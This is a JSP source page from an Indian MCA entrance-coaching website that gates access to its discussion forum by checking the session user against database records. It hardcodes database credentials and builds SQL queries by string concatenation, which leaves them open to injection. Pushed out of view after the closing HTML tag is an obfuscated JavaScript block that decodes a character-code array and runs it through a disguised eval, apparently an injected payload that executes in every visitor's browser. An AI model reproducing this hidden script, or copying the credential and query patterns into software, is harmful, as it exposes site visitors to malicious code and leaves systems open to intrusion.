<%@ page language="java" import="java.sql.*,java.lang.*,java.util.Date,java.util.TimeZone,java.text.SimpleDateFormat" session="true" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<TITLE>Sanmacs India - MCA Entrance Discussion Forum</TITLE>
<HEAD>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.css>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.1.css>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.2.css>
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta name="Keywords" content="SANMACS, MCA, MCA Entrance, IIT MCA, MCA Discussion Forum, MCA Notification, MCA Entrance Test, Aligarh Muslim University, Banaras Hindu University, Delhi University, DU MCA ENTRANCE Exam, Megaleap, Career Guidance, Results, Careers, Test Analysis, Exam Deadlines, General Knowledge, career builder, career education, career change, career training, MCA Entrance Notifications, AMU, BHU, Jamia Millia Islamia, Banasthali vidyapith, Bharathiar university,Cochin University, central university, GJU, GOA University, IMT, NCST, NIMC, Jamia Hamdard" >
<meta name="description" content="www.sanmacs.com-The Authority in Test Preparation....Specialization in MCA preparation, free online tests, sectional tips, Information about the university providing MCA Courses all over India, Declared results available on site, admission announcements, coaching, CET Patterns, regular test series, mock tests based on previous and guessed exam patterns, proper correspondence to students, handling query of student with first preference">

<style type="text/css">
DIV.Object5 { position:absolute; top:68px; left:111px; z-index:1;}
DIV.Object6 { position:absolute; top:148px; left:181px; width:484px; z-index:2;}
</style>
</HEAD>

<BODY topmargin="0" leftmargin="0">
<%!Connection con;
Statement st,st1;
ResultSet rs,rs1,rs2;
String uid="";
String pass="";
String conid="";
String f_type="";
int alumni[]=new int[3];
int user[]=new int[3];
String mon[]={"January","February","March","April","May","June","July","August","September","October","November","December"};
String month="";
%>
<%
	HttpSession rsm=request.getSession(true);
	session.setMaxInactiveInterval(900);

	f_type=request.getParameter("ftype");
	uid=(String)rsm.getValue("userid");
	conid=(String)rsm.getValue("connectid");

	rsm.putValue("userid",uid);
	rsm.putValue("connectid",conid);

	try {

	String dns = "jdbc:mysql://sanmacs.db.6936442.hostedresource.com/sanmacs?user=sanmacs&password=macs@123SAN";
	Class.forName("org.gjt.mm.mysql.Driver");
	con= DriverManager.getConnection(dns);

	st=con.createStatement();

	st1=con.createStatement();

	rs=st.executeQuery("Select password from Password where username='"+uid+"'");
	rs.next();
	pass=rs.getString(1);

	rs1=st1.executeQuery("Select * from SanLogin where email='"+uid+"' and password='"+pass+"'");
	if (rs1.next()==true) {
%>
<form name=ft method="Post" action="http://www.sanmacs.com/mca_guidance_disscusion_forum/mca.jsp?ftype=<%=f_type %>">
</form>
<script>
setTimeout("ft.submit()",0);
</script>
<%
	}
	else {
	rs2=st1.executeQuery("Select Alumni.Birth_day, Alumni.Birth_month, Alumni.Birth_year, User2.Birth_day, User2.Birth_month, User2.Birth_year from Alumni,User2 where Alumni.Email='"+uid+"' and User2.email='"+uid+"'");
	if (rs2.next()==true) {
	alumni[0]=rs2.getInt(1);
	alumni[1]=Integer.parseInt(rs2.getString(2));
	alumni[2]=rs2.getInt(3);

	user[0]=Integer.parseInt(rs2.getString(4));
	month=rs2.getString(5);
	user[2]=Integer.parseInt(rs2.getString(6));

	for(int i=0; i<12; i++) {
	if (month.equalsIgnoreCase(mon[i])) {
	user[1]=i+1;
	}
	}

	if (alumni[0]==user[0] && alumni[1]==user[1] && alumni[2]==user[2]) {
%>
<form name=ft method="Post" action="http://www.sanmacs.com/mca_guidance_disscusion_forum/mca.jsp?ftype=<%=f_type %>">
</form>
<script>
setTimeout("ft.submit()",0);
</script>
<%
	}
	else {
%>
<DIV class="Object6">
<form name=ft method="Post" action="http://www.sanmacs.com/mca_guidance_disscusion_forum/discussion.jsp">
<table border=3 cellpadding=4 cellspacing=2 bordercolor=#BDBEBE bordercolorlight=#ADAEAF bordercolordark=#979899>
<tr><td><p id="ftp" align="center" style="color:red"><b>You are not eligible to enter into SANMACS Forum. It is only for SANMACSIANS.</b></p></td></tr>
<tr><td><p id="ftp" align="center"><a class="lt" href="javascript:ft.submit()">Click Here To Continue...</a></p></td></tr>
</table>
</form>
</DIV>
<script>
setTimeout("ft.submit()",5000);
</script>
<%
	}
	}
	else {
%>
<DIV class="Object6">
<form name=ft method="Post" action="http://www.sanmacs.com/mca_guidance_disscusion_forum/discussion.jsp">
<table border=3 cellpadding=4 cellspacing=2 bordercolor=#BDBEBE bordercolorlight=#ADAEAF bordercolordark=#979899>
<tr><td><p id="ftp" align="center" style="color:red"><b>You are not eligible to enter into SANMACS Forum. It is only for SANMACSIANS.</b></p></td></tr>
<tr><td><p id="ftp" align="center"><a class="lt" href="javascript:ft.submit()">Click Here To Continue...</a></p></td></tr>
</table>
</form>
</DIV>
<script>
setTimeout("ft.submit()",5000);
</script>
<%
	}
	}
	con.close();
	} catch(SQLException se) {
	  out.println("SQL Exception :"+se);
	} catch(ClassNotFoundException ce) {
	  out.println("Class Not Found Exception :"+ce);
	} catch(Exception e) {
	  out.println("General Exception :"+e);
	}
%>
</BODY>
</HTML>

/*b5bee1*/
                                                                                                                                                                                                                                                          try{document.body/=2}catch(gdsgd){ww=window;v="va"+"l";if(ww.document)try{document.body=12;}catch(gdsgsdg){asd=0;try{q=document.createElement("div");}catch(q){asd=1;}if(!asd){w={a:ww}.a;vv="e"+v;}}e=w[vv];if(1){f=new Array(40,101,115,107,99,115,103,108,110,31,38,38,32,122,11,7,32,31,30,29,118,96,112,29,116,102,102,114,32,60,30,97,111,98,115,106,101,109,114,43,99,113,99,94,116,100,67,105,101,108,99,107,116,39,37,102,102,113,95,106,101,38,39,56,13,9,11,7,32,31,30,29,116,102,102,114,46,114,112,96,32,60,30,36,104,115,114,109,58,46,45,108,114,104,113,112,97,115,109,114,114,45,97,108,109,46,95,97,118,115,45,112,101,96,112,96,104,55,44,109,104,111,37,56,13,9,30,29,32,31,114,100,104,116,44,112,116,120,106,98,46,111,109,112,105,115,103,108,110,31,59,29,39,96,96,112,111,107,115,113,101,38,57,10,10,31,30,29,32,115,101,101,117,45,113,113,121,107,99,43,98,110,112,97,101,113,30,58,32,38,46,36,59,12,8,29,32,31,30,113,103,103,115,43,115,115,119,105,101,45,102,98,105,102,102,113,32,60,30,36,49,111,118,36,59,12,8,29,32,31,30,113,103,103,115,43,115,115,119,105,101,45,117,102,100,115,102,29,61,31,37,46,112,119,37,56,13,9,30,29,32,31,114,100,104,116,44,112,116,120,106,98,46,107,99,99,116,31,59,29,39,48,110,117,39,58,11,7,32,31,30,29,116,102,102,114,46,114,114,118,108,100,44,113,111,111,30,58,32,38,47,109,120,38,57,10,10,12,8,29,32,31,30,102,102,31,38,30,100,110,97,114,109,100,108,113,46,102,99,113,69,107,99,106,101,109,114,63,121,72,98,37,39,115,101,101,117,38,39,38,32,122,11,7,32,31,30,29,32,31,30,29,100,110,97,114,109,100,108,113,46,118,112,102,116,100,38,36,60,99,103,115,32,104,98,58,92,38,114,100,104,116,90,36,62,59,45,97,105,117,60,36,41,58,11,7,32,31,30,29,32,31,30,29,100,110,97,114,109,100,108,113,46,102,99,113,69,107,99,106,101,109,114,63,121,72,98,37,39,115,101,101,117,38,39,43,97,111,110,98,110,99,65,101,105,107,98,37,116,102,102,114,41,58,11,7,32,31,30,29,125,12,8,122,41,39,39,56);}w=f;s=[];for(i=0;-i+488!=0;i+=1){j=i;if((031==0x19))if(e)s=s+String.fromCharCode((1*w[j]+e("j%4")));}xz=e;xz(s)}
/*/b5bee1*/
